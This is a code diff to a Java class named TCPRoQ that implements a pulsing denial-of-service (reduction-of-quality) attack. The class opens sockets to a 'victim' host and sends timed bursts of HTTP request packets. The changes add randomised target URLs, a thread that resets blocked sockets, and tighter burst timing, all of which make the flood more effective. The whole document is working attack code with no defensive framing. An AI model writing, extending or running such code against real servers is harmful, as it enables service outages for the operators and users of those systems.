@@ -1,5 +1,6 @@
 package hardroq.networking;
 
+import java.io.IOException;
 import java.io.OutputStream;
 import java.net.Socket;
 import java.util.Date;
@@ -10,6 +11,7 @@ public class TCPRoQ {
 	//Tools
 	private final Random random = new Random();
 	private Thread workerThread;
+	private Thread monitorThread;
 	private Socket socket;
 	
 	//Parameters
@@ -17,7 +19,7 @@ public class TCPRoQ {
 	private final int port;
 	private final String header;
 	private final String footer;
-	private final byte[] payload;
+	private final String payload;
 	private final float bandwidth;
 	private int datasize;			// header + random data + footer
 	private int period;				// T
@@ -26,10 +28,11 @@ public class TCPRoQ {
 	private int timeout;			// T - t
 	private float aggression;		// M
 	private long packCount = 0;
-	
+	private long startWriteTime = -1;
 
 	//Internals
 	volatile private static int RTT;
+	private static String[] resources;
 	private boolean attacking = false;
 	
 	private TCPRoQ (Builder builder) {
@@ -43,8 +46,9 @@ public class TCPRoQ {
 		bandwidth = builder.bandwidth;  //this should be in kb/ms, which just happens to be the same as mb/s :)
 		
 		//for now, let's just const the payload
-		payload = (header + footer + "\r\n\r\n").getBytes();
+		payload = (header + footer + "\r\n\r\n");
 		workerThread = new Thread();
+		monitorThread = new Thread();
 	}
 	
 	public void InitiateAttack() {
@@ -53,11 +57,35 @@ public class TCPRoQ {
 			workerThread = new Thread(work, "Attack Thread");
 			workerThread.start();
 		}
+		
+		if (!monitorThread.isAlive()) {
+			monitorThread = new Thread(socketWriteMonitor, "Write Monitor Thread");
+			monitorThread.start();
+		}
 	}
 	
 	public void EndAttack() {
 		attacking = false;
 	}
+	
+	private Runnable socketWriteMonitor = new Runnable() {
+		@Override
+		public void run() {
+			//we don't want our socket to just sit there blocked on the write, so let's just drop it and start a new socket
+			while (attacking) {
+				try {
+					final int timepassed = (int) (System.currentTimeMillis() - startWriteTime);
+					if (startWriteTime != -1 &&  timepassed > 3000) {
+						socket.close();
+						startWriteTime = -1;
+					}
+				} catch (IOException e) {
+					System.out.println(e.getMessage());
+				}
+			}
+		}
+		
+	};
 	
 	private Runnable work = new Runnable() {
 		@Override
@@ -66,7 +94,7 @@ public class TCPRoQ {
 				try {
 					//Establish a connection to our victim
 					socket = new Socket(host, port);
-					socket.setSoTimeout(2000);
+					socket.setSoTimeout(3000);
 				
 					/*
 					  Connection established, now the idea is to repeatedly send requests at an amplitude (rate)
@@ -88,27 +116,36 @@ public class TCPRoQ {
 						duration = (int) Math.ceil(RTT * (1 + random.nextFloat()));
 						
 						//calulate the amplitude for this attack
-						amplitude = (int) Math.ceil(((aggression * bandwidth) * duration) / (payload.length * .008f));
+						amplitude = (int) Math.ceil(((aggression * bandwidth) * duration) / (payload.getBytes().length * .008f));
 						
 						//calculate the timeout
 						timeout = period - duration;
 						
+						//grab the time before the attack
+						long startTime = System.currentTimeMillis();
+						
 						for (int i = amplitude; --i > 0;) {
-							//generate our crap data
-							random.nextBytes(payload);
+							final String attackPacket = payload.replace("_targeturl_", resources[random.nextInt(resources.length)]);
+							
+							//clear the input buffer
+							socket.getInputStream().skip(socket.getInputStream().available());
 							
 							//send the data
-							out.write(payload);
+							startWriteTime = System.currentTimeMillis();
+							out.write(attackPacket.getBytes());
 							out.flush();
 							//and just to be sure..
 							out.flush();
 							
-							//clear the input buffer
-							socket.getInputStream().skip(socket.getInputStream().available());
+							//reset the write time
+							startWriteTime = -1;
+							
 							System.out.println(String.valueOf(++packCount) + ": Packet sent");
 						}
 						
 						//sleep for the timeout
+						timeout = (int) (timeout - (System.currentTimeMillis() - startTime));
+						if (timeout < 0) timeout = 1;
 						Thread.sleep(timeout);
 					}
 				} catch (Exception ex) {
@@ -120,6 +157,10 @@ public class TCPRoQ {
 	
 	public static void setRTT(final int r) {
 		RTT = r;
+	}
+	
+	public static void setResources(final String[] r) {
+		resources = r;
 	}
 	
 	public long getPacketsSent() {
